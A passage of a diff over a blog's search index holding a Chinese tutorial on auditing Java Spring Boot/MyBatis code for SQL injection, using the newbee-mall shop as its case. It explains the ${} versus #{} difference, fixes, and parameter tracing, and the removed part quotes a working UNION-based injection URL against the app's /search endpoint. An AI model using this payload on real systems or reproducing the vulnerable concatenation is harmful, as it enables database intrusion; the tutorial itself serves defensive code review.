+<h1 id="SQL注入产生原理"><a href="#SQL注入产生原理" class="headerlink" title="SQL注入产生原理"></a>SQL注入产生原理</h1><p>为什么将<code>${}</code>改为<code>#{}</code>就能防止SQL注入呢？</p>
+<p>MyBatis<a href="https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select" target="_blank" rel="noopener">官方文档</a>中有如下叙述:</p>
+<blockquote>
+<p><code>#{}</code>告诉 MyBatis 创建一个预编译语句（PreparedStatement）参数，在 JDBC 中，这样的一个参数在 SQL 中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 近似的 JDBC 代码，非 MyBatis 代码...</span></span><br><span class="line">String selectPerson = <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span>;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(selectPerson);</span><br><span class="line">ps.setInt(<span class="number">1</span>,id);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/prepareStatement.png" alt="prepareStatement"></p>
+<p><code>${}</code> 仅仅是纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换，类似于直接替换字符串，会导致SQL注入产生。</p>
+<p>官方也给出警示：</p>
+<blockquote>
+<p>用这种方式接受用户的输入，并将其用于语句中的参数是不安全的，会导致潜在的 SQL 注入攻击，<strong>因此要么不允许用户输入这些字段，要么自行转义并检验</strong>。</p>
+</blockquote>
+<p>开发的原则是能使用<code>#{}</code>的地方，一定使用<code>#{}</code>。但是SQL语句中存在无法使用<code>#{}</code>的场景，因为使用<code>#{}</code>会在原本的字段加上引号<code>&#39;&#39;</code>，导致SQL语句报错。不能使用<code>#{}</code>的场景我们需要特别注意，此处极易产生SQL注入。</p>
+<p>不能使用<code>#{}</code>的场景有：</p>
+<ol>
+<li>表名/字段名</li>
+<li>order by/group by</li>
+<li>like模糊查询</li>
+<li>in</li>
+</ol>
+<p>以表名为例，使用<code>#{}</code>替换字符串时会带上单引号 <code>&#39;&#39;</code>，这会导致 sql 语法错误，例如：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="comment">#&#123;tableName&#125; where name = #&#123;name&#125;;</span></span><br></pre></td></tr></table></figure>
+
+<p>预编译之后的sql 变为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ? <span class="keyword">where</span> <span class="keyword">name</span> = ?;</span><br></pre></td></tr></table></figure>
+
+<p>假设我们传入的参数为 tableName = “user” , name = “username”，那么在占位符进行变量替换后，sql 语句变为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'user'</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'username'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上述 sql 语句是存在语法错误的，表名不能加单引号 <code>&#39;&#39;</code>（不过反引号 ``是可以的）。</p>
+<p>不过表名一般不会通过用户传入，即使是用户传入，由于Mybatis的查询机制，并不会产生SQL注入。</p>
+<p>避免使用<code>${}</code>的方法</p>
+<ol>
+<li>表名/字段名</li>
+</ol>
+<p>尽量直接使用表名和字段名，如果有动态查询的需求时，将表名和字段名限定在指定字符。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tableName = tableName.replaceAll(<span class="string">"[^a-zA-Z0-9+]"</span>, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li>order by/group by </li>
+</ol>
+<p>order by后</p>
+<p>修复方法是推荐开发在Java层面做映射，设置一个字段/表名数组，仅允许用户传入索引值。这样保证传入的字段或者表名都在白名单里面。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">query.append(<span class="string">" ORDER BY "</span>);    </span><br><span class="line">String[] orderByFields = orderByComparator.getOrderByFields();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; orderByFields.length; i++) &#123;</span><br><span class="line">query.append(<span class="string">"appSetPersonal."</span>);</span><br><span class="line">query.append(orderByFields[i]);</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">1</span> &lt; orderByFields.length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (orderByComparator.isAscending() ^ previous) &#123;</span><br><span class="line">        query.append(<span class="string">" ASC, "</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        query.append(<span class="string">" DESC, "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (orderByComparator.isAscending() ^ previous) &#123;</span><br><span class="line">    query.append(<span class="string">" ASC"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    query.append(<span class="string">" DESC"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者将传入的值限定在指定字符，如</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">orderByField = orderByField.replaceAll(<span class="string">"[^a-zA-Z0-9+]"</span>, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>like模糊查询</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="keyword">CONCAT</span>(<span class="string">'%'</span>,<span class="comment">#&#123;param&#125;,'%')</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">oracle</span>: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="string">'%'</span>||<span class="comment">#&#123;param&#125;||'%'</span></span><br><span class="line"></span><br><span class="line">mssql: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="string">'%'</span>+<span class="comment">#&#123;param&#125;+'%'</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>in</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> </span><br><span class="line">&lt;foreach collection=<span class="string">"ids"</span> item=<span class="string">"item"</span> <span class="keyword">open</span>=<span class="string">"("</span> separator=<span class="string">","</span> <span class="keyword">close</span>=<span class="string">")"</span>&gt;</span><br><span class="line"><span class="comment">#&#123;item&#125;</span></span><br><span class="line">&lt;/foreach&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="SQL注入代码审计"><a href="#SQL注入代码审计" class="headerlink" title="SQL注入代码审计"></a>SQL注入代码审计</h1><p>知道了SQL注入产生的原理，那么找漏洞就非常简单了。SQL注入是代码审计中最好找的漏洞之一，只需分析SQL语句发现拼接，再逆向追踪拼接参数用户是否可控。不用被代码的多层调用所干扰。</p>
+<p>SQL注入审计过程：</p>
+<ol>
+<li>在Dao层（Mybaits在Mapper中，Mybatis也有注解写SQL的方式，但很少用），查看SQL语句是否使用拼接，关注<code>${}</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select id&#x3D;&quot;getUID&quot; parameterType&#x3D;&quot;string&quot; reusltType&#x3D;&quot;User&quot;&gt;</span><br><span class="line">    select * from user where uid&#x3D;$&#123;uid&#125;</span><br><span class="line">&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>
+
+<p>  其他SQL拼接：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># JDBC中的拼接，关注+：</span><br><span class="line">sqlString.append(<span class="string">"select * from user where uid='"</span>+ UID +<span class="string">"'"</span>);</span><br><span class="line"># JDBC中的预编译：</span><br><span class="line">sqlString.append(<span class="string">"select * from user where uid= ?"</span>);</span><br><span class="line"></span><br><span class="line"># Hibernate中的拼接：</span><br><span class="line">sql.append(<span class="string">"select * from user where uid = '"</span> + UID + <span class="string">"'"</span>);</span><br><span class="line">List result = session.createQuery(queryString).list();</span><br><span class="line"># Hibernate中的预编译</span><br><span class="line">sql.append(<span class="string">"select * from user where uid = :UID"</span>);</span><br><span class="line">paramters.setString(<span class="string">"UID"</span>, UID);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>若存在拼接参数，则逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为<code>Mapper -&gt; Dao -&gt; ServiceImpl -&gt; Controller</code></li>
+</ol>
+<p>⚠️ 并不是全部的<code>${}</code>拼接都会产生漏洞的，有以下几种情况是不存在SQL注入的：</p>
+<ol>
+<li>param不是用户传参进来的</li>
+<li>param不是字符类型，比如说parameter为int类型，只能传入数字，就没法产生SQL注入</li>
+<li>param在过程中已经转义或过滤字符，但是在Mybaits的SQL语句中看不出来，需考虑是否能绕过</li>
+</ol>
+<h1 id="参数追踪"><a href="#参数追踪" class="headerlink" title="参数追踪"></a>参数追踪</h1><p>以文章开头的SQL注入为例，来进行<code>keyword</code>参数逆向追踪过程</p>
+<p><code>/src/main/resources/mapper/NewBeeMallGoodsMapper.xml:70,94</code>存在<code>${}</code>拼接</p>
+<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/sqli-in-like.png" alt="sqli-in-like"></p>
+<p>可以看到在like后面使用了concat拼接，这是因为mapper.xml是使用mybatis-generator自动生成的，产生的like语句和in语句默认使用<code>#{}</code>，但这里使用<code>${}</code>拼接字符可能是由于作者修改功能时更改，导致SQL注入漏洞产生。</p>
+<p>同文件第三行，可以看到namespace为<code>ltd.newbee.mall.dao.NewBeeMallGoodsMapper</code></p>
+<p><code>/src/main/resources/mapper/NewBeeMallGoodsMapper.xml:3</code></p>
+<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/mapper-namespace.png" alt="mapper-namespace"></p>
+<p>找到<code>ltd.newbee.mall.dao.NewBeeMallGoodsMapper</code>，根据xml中的select id找到<code>findNewBeeMallGoodsList</code>和<code>findNewBeeMallGoodsListBySearch</code>这两个方法。</p>
+<p><code>/src/main/java/ltd/newbee/mall/dao/NewBeeMallGoodsMapper.java</code></p>
+<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/NewBeeMallGoodsMapper.png" alt="NewBeeMallGoodsMapper"></p>
+<p>查看<code>findNewBeeMallGoodsListBySearch</code>方法的引用，追踪该处引用（Sublime将鼠标放在方法上可直接查看引用，IntelliJ IDEA可右键“Find Usages”或Option/Alt+F7查看引用）</p>
+<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/find-usages.png" alt="find-usages"></p>
+<p>追踪到<code>searchNewBeeMallGoods</code>方法，这里是<code>Service</code>层，主要负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。当前类<code>NewBeeMallGoodsServiceImpl</code>中的Impl就是implement（实现）中的impl。</p>
+<p>由于Service中都是接口，审计时一般直接查看<code>ServiceImpl</code>，忽视<code>Service</code>。</p>
+<p><code>/src/main/java/ltd/newbee/mall/service/impl/NewBeeMallGoodsServiceImpl.java:73</code></p>
+<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/NewBeeMallGoodsServiceImpl.png" alt="NewBeeMallGoodsServiceImpl"></p>
+<p>再追踪<code>searchNewBeeMallGoods</code>方法引用，来到<code>searchPage</code>方法。这里是<code>Controller</code>层，负责业务模块流程的控制，获取用户传来的参数后调用<code>Service</code>层的接口来控制业务流程。</p>
+<p>SpringBoot使用注解来控制URL路径，<code>searchNewBeeMallGoods</code>使用<code>@GetMapping({&quot;/search&quot;, &quot;/search.html&quot;})</code>表明接收来自<code>/search</code>或<code>/search.html</code>的get请求。</p>
+<p><code>/src/main/java/ltd/newbee/mall/controller/mall/GoodsController.java:57</code></p>
+<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/GoodsController.png" alt="GoodsController"></p>
+<p>从48行可以看到，<code>keyword</code>为字符串类型，可以传入任意字符。51行将<code>params.get(&quot;keyword&quot;)</code>中的值赋给<code>keyword</code>变量，仅做了非空判断。</p>
+<p>其中if判断注释写着“去掉空格”，并不是将<code>keyword</code>参数中的空格去掉，而是去掉空格之后进行非空判断，不用考虑SQL注入绕过空格的方法。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对keyword做过滤 去掉空格</span></span><br><span class="line"><span class="keyword">if</span> (params.containsKey(<span class="string">"keyword"</span>) &amp;&amp; !StringUtils.isEmpty((params.get(<span class="string">"keyword"</span>) + <span class="string">""</span>).trim()))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>整个参数追踪就到这，还有一个需要注意的地方就是看看应用中是否存在过滤器，过滤器是否会将特殊字符拦截。该应用没有针对SQL注入的过滤器，所以追踪完参数，可以确定该处SQL拼接存在注入漏洞。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于SQL注入的审计，在Mapper中搜寻是否存在<code>${}</code>拼接的情况，尤其注意order by、group by、like、in。找到拼接后再逆向追踪参数，判断参数是否可控，是否是字符类型，检查是否存在过滤器过滤SQL字符。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select" target="_blank" rel="noopener">https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select</a></p>
+<p><a href="https://segmentfault.com/a/1190000004617028" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004617028</a></p>
+<p><a href="https://c0d3p1ut0s.github.io/MyBatis框架中常见的SQL注入/" target="_blank" rel="noopener">https://c0d3p1ut0s.github.io/MyBatis%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -619,136 +766,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Java SpringBoot框架代码审计三 - SQL注入</title>
-    <url>/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/</url>
-    <content><![CDATA[<h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><p>SQL注入是代审中最容易找的漏洞之一，一般都在固定的模块存放SQL语句，只需在这些SQL语句中搜寻是否拼接参数即可。</p>
-<p><a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">案例项目</a>使用Mybatis作为数据持久层框架，进行数据库的各种操作。MyBatis的主要思想是将程序中的大量SQL语句剥离出来，配置在配置文件当中，实现SQL的灵活配置。配置文件常存放在<code>src/main/resources/mapper</code>中，配置文件命名为<code>ExampleMapper.xml</code></p>
-<a id="more"></a>
-
-<p>在<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">项目</a>的第一个issue中看到已经有人提出<a href="https://github.com/newbee-ltd/newbee-mall/issues/1" target="_blank" rel="noopener">SQL注入漏洞</a>，并给出poc： <code>http://127.0.0.1:28089/search?goodsCategoryId=&amp;keyword=\%&#39;)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627871,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x7162786b71),NULL,NULL#&amp;orderBy=default</code>   </p>
-<img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/SQLi-issue.png" alt="SQLi-issue" style="zoom:50%;">
-
-<p>随后作者对该SQL注入点进行修复，<a href="https://github.com/newbee-ltd/newbee-mall/commit/dac570107a67044ac754c9a20cd6ef305ed56b0e#comments" target="_blank" rel="noopener">commit</a>中将<code>like</code>模糊查询处的<code>${keyword}</code>改为<code>#{keyword}</code>。</p>
-<img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/fix-sqli-ommit.png" alt="fix-sqli-ommit" style="zoom:40%;">
-
-
-
-<h1 id="SQL注入产生原理"><a href="#SQL注入产生原理" class="headerlink" title="SQL注入产生原理"></a>SQL注入产生原理</h1><p>为什么将<code>${}</code>改为<code>#{}</code>就能防止SQL注入呢？</p>
-<p>MyBatis<a href="https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select" target="_blank" rel="noopener">官方文档</a>中有如下叙述:</p>
-<blockquote>
-<p><code>#{}</code>告诉 MyBatis 创建一个预编译语句（PreparedStatement）参数，在 JDBC 中，这样的一个参数在 SQL 中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 近似的 JDBC 代码，非 MyBatis 代码...</span></span><br><span class="line">String selectPerson = <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span>;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(selectPerson);</span><br><span class="line">ps.setInt(<span class="number">1</span>,id);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/prepareStatement.png" alt="prepareStatement"></p>
-<p><code>${}</code> 仅仅是纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换，类似于直接替换字符串，会导致SQL注入产生。</p>
-<p>官方也给出警示：</p>
-<blockquote>
-<p>用这种方式接受用户的输入，并将其用于语句中的参数是不安全的，会导致潜在的 SQL 注入攻击，<strong>因此要么不允许用户输入这些字段，要么自行转义并检验</strong>。</p>
-</blockquote>
-<p>开发的原则是能使用<code>#{}</code>的地方，一定使用<code>#{}</code>。但是SQL语句中存在无法使用<code>#{}</code>的场景，因为使用<code>#{}</code>会在原本的字段加上引号<code>&#39;&#39;</code>，导致SQL语句报错。不能使用<code>#{}</code>的场景我们需要特别注意，此处极易产生SQL注入。</p>
-<p>不能使用<code>#{}</code>的场景有：</p>
-<ol>
-<li>表名/字段名</li>
-<li>order by/group by</li>
-<li>like模糊查询</li>
-<li>in</li>
-</ol>
-<p>以表名为例，使用<code>#{}</code>替换字符串时会带上单引号 <code>&#39;&#39;</code>，这会导致 sql 语法错误，例如：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="comment">#&#123;tableName&#125; where name = #&#123;name&#125;;</span></span><br></pre></td></tr></table></figure>
-
-<p>预编译之后的sql 变为：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ? <span class="keyword">where</span> <span class="keyword">name</span> = ?;</span><br></pre></td></tr></table></figure>
-
-<p>假设我们传入的参数为 tableName = “user” , name = “username”，那么在占位符进行变量替换后，sql 语句变为</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'user'</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'username'</span>;</span><br></pre></td></tr></table></figure>
-
-<p>上述 sql 语句是存在语法错误的，表名不能加单引号 <code>&#39;&#39;</code>（不过反引号 ``是可以的）。</p>
-<p>不过表名一般不会通过用户传入，即使是用户传入，由于Mybatis的查询机制，并不会产生SQL注入。</p>
-<p>避免使用<code>${}</code>的方法</p>
-<ol>
-<li>表名/字段名</li>
-</ol>
-<p>尽量直接使用表名和字段名，如果有动态查询的需求时，将表名和字段名限定在指定字符。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tableName = tableName.replaceAll(<span class="string">"[^a-zA-Z0-9+]"</span>, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<ol start="2">
-<li>order by/group by </li>
-</ol>
-<p>order by后</p>
-<p>修复方法是推荐开发在Java层面做映射，设置一个字段/表名数组，仅允许用户传入索引值。这样保证传入的字段或者表名都在白名单里面。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">query.append(<span class="string">" ORDER BY "</span>);    </span><br><span class="line">String[] orderByFields = orderByComparator.getOrderByFields();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; orderByFields.length; i++) &#123;</span><br><span class="line">query.append(<span class="string">"appSetPersonal."</span>);</span><br><span class="line">query.append(orderByFields[i]);</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">1</span> &lt; orderByFields.length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (orderByComparator.isAscending() ^ previous) &#123;</span><br><span class="line">        query.append(<span class="string">" ASC, "</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        query.append(<span class="string">" DESC, "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (orderByComparator.isAscending() ^ previous) &#123;</span><br><span class="line">    query.append(<span class="string">" ASC"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    query.append(<span class="string">" DESC"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>或者将传入的值限定在指定字符，如</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">orderByField = orderByField.replaceAll(<span class="string">"[^a-zA-Z0-9+]"</span>, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>like模糊查询</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="keyword">CONCAT</span>(<span class="string">'%'</span>,<span class="comment">#&#123;param&#125;,'%')</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">oracle</span>: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="string">'%'</span>||<span class="comment">#&#123;param&#125;||'%'</span></span><br><span class="line"></span><br><span class="line">mssql: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="string">'%'</span>+<span class="comment">#&#123;param&#125;+'%'</span></span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>in</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> </span><br><span class="line">&lt;foreach collection=<span class="string">"ids"</span> item=<span class="string">"item"</span> <span class="keyword">open</span>=<span class="string">"("</span> separator=<span class="string">","</span> <span class="keyword">close</span>=<span class="string">")"</span>&gt;</span><br><span class="line"><span class="comment">#&#123;item&#125;</span></span><br><span class="line">&lt;/foreach&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="SQL注入代码审计"><a href="#SQL注入代码审计" class="headerlink" title="SQL注入代码审计"></a>SQL注入代码审计</h1><p>知道了SQL注入产生的原理，那么找漏洞就非常简单了。SQL注入是代码审计中最好找的漏洞之一，只需分析SQL语句发现拼接，再逆向追踪拼接参数用户是否可控。不用被代码的多层调用所干扰。</p>
-<p>SQL注入审计过程：</p>
-<ol>
-<li>在Dao层（Mybaits在Mapper中，Mybatis也有注解写SQL的方式，但很少用），查看SQL语句是否使用拼接，关注<code>${}</code></li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select id&#x3D;&quot;getUID&quot; parameterType&#x3D;&quot;string&quot; reusltType&#x3D;&quot;User&quot;&gt;</span><br><span class="line">    select * from user where uid&#x3D;$&#123;uid&#125;</span><br><span class="line">&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>
-
-<p>  其他SQL拼接：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># JDBC中的拼接，关注+：</span><br><span class="line">sqlString.append(<span class="string">"select * from user where uid='"</span>+ UID +<span class="string">"'"</span>);</span><br><span class="line"># JDBC中的预编译：</span><br><span class="line">sqlString.append(<span class="string">"select * from user where uid= ?"</span>);</span><br><span class="line"></span><br><span class="line"># Hibernate中的拼接：</span><br><span class="line">sql.append(<span class="string">"select * from user where uid = '"</span> + UID + <span class="string">"'"</span>);</span><br><span class="line">List result = session.createQuery(queryString).list();</span><br><span class="line"># Hibernate中的预编译</span><br><span class="line">sql.append(<span class="string">"select * from user where uid = :UID"</span>);</span><br><span class="line">paramters.setString(<span class="string">"UID"</span>, UID);</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>若存在拼接参数，则逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为<code>Mapper -&gt; Dao -&gt; ServiceImpl -&gt; Controller</code></li>
-</ol>
-<p>⚠️ 并不是全部的<code>${}</code>拼接都会产生漏洞的，有以下几种情况是不存在SQL注入的：</p>
-<ol>
-<li>param不是用户传参进来的</li>
-<li>param不是字符类型，比如说parameter为int类型，只能传入数字，就没法产生SQL注入</li>
-<li>param在过程中已经转义或过滤字符，但是在Mybaits的SQL语句中看不出来，需考虑是否能绕过</li>
-</ol>
-<h1 id="参数追踪"><a href="#参数追踪" class="headerlink" title="参数追踪"></a>参数追踪</h1><p>以文章开头的SQL注入为例，来进行<code>keyword</code>参数逆向追踪过程</p>
-<p><code>/src/main/resources/mapper/NewBeeMallGoodsMapper.xml:70,94</code>存在<code>${}</code>拼接</p>
-<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/sqli-in-like.png" alt="sqli-in-like"></p>
-<p>可以看到在like后面使用了concat拼接，这是因为mapper.xml是使用mybatis-generator自动生成的，产生的like语句和in语句默认使用<code>#{}</code>，但这里使用<code>${}</code>拼接字符可能是由于作者修改功能时更改，导致SQL注入漏洞产生。</p>
-<p>同文件第三行，可以看到namespace为<code>ltd.newbee.mall.dao.NewBeeMallGoodsMapper</code></p>
-<p><code>/src/main/resources/mapper/NewBeeMallGoodsMapper.xml:3</code></p>
-<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/mapper-namespace.png" alt="mapper-namespace"></p>
-<p>找到<code>ltd.newbee.mall.dao.NewBeeMallGoodsMapper</code>，根据xml中的select id找到<code>findNewBeeMallGoodsList</code>和<code>findNewBeeMallGoodsListBySearch</code>这两个方法。</p>
-<p><code>/src/main/java/ltd/newbee/mall/dao/NewBeeMallGoodsMapper.java</code></p>
-<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/NewBeeMallGoodsMapper.png" alt="NewBeeMallGoodsMapper"></p>
-<p>查看<code>findNewBeeMallGoodsListBySearch</code>方法的引用，追踪该处引用（Sublime将鼠标放在方法上可直接查看引用，IntelliJ IDEA可右键“Find Usages”或Option/Alt+F7查看引用）</p>
-<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/find-usages.png" alt="find-usages"></p>
-<p>追踪到<code>searchNewBeeMallGoods</code>方法，这里是<code>Service</code>层，主要负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。当前类<code>NewBeeMallGoodsServiceImpl</code>中的Impl就是implement（实现）中的impl。</p>
-<p>由于Service中都是接口，审计时一般直接查看<code>ServiceImpl</code>，忽视<code>Service</code>。</p>
-<p><code>/src/main/java/ltd/newbee/mall/service/impl/NewBeeMallGoodsServiceImpl.java:73</code></p>
-<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/NewBeeMallGoodsServiceImpl.png" alt="NewBeeMallGoodsServiceImpl"></p>
-<p>再追踪<code>searchNewBeeMallGoods</code>方法引用，来到<code>searchPage</code>方法。这里是<code>Controller</code>层，负责业务模块流程的控制，获取用户传来的参数后调用<code>Service</code>层的接口来控制业务流程。</p>
-<p>SpringBoot使用注解来控制URL路径，<code>searchNewBeeMallGoods</code>使用<code>@GetMapping({&quot;/search&quot;, &quot;/search.html&quot;})</code>表明接收来自<code>/search</code>或<code>/search.html</code>的get请求。</p>
-<p><code>/src/main/java/ltd/newbee/mall/controller/mall/GoodsController.java:57</code></p>
-<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/GoodsController.png" alt="GoodsController"></p>
-<p>从48行可以看到，<code>keyword</code>为字符串类型，可以传入任意字符。51行将<code>params.get(&quot;keyword&quot;)</code>中的值赋给<code>keyword</code>变量，仅做了非空判断。</p>
-<p>其中if判断注释写着“去掉空格”，并不是将<code>keyword</code>参数中的空格去掉，而是去掉空格之后进行非空判断，不用考虑SQL注入绕过空格的方法。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对keyword做过滤 去掉空格</span></span><br><span class="line"><span class="keyword">if</span> (params.containsKey(<span class="string">"keyword"</span>) &amp;&amp; !StringUtils.isEmpty((params.get(<span class="string">"keyword"</span>) + <span class="string">""</span>).trim()))</span><br></pre></td></tr></table></figure>
-
-
-
-<p>整个参数追踪就到这，还有一个需要注意的地方就是看看应用中是否存在过滤器，过滤器是否会将特殊字符拦截。该应用没有针对SQL注入的过滤器，所以追踪完参数，可以确定该处SQL拼接存在注入漏洞。</p>
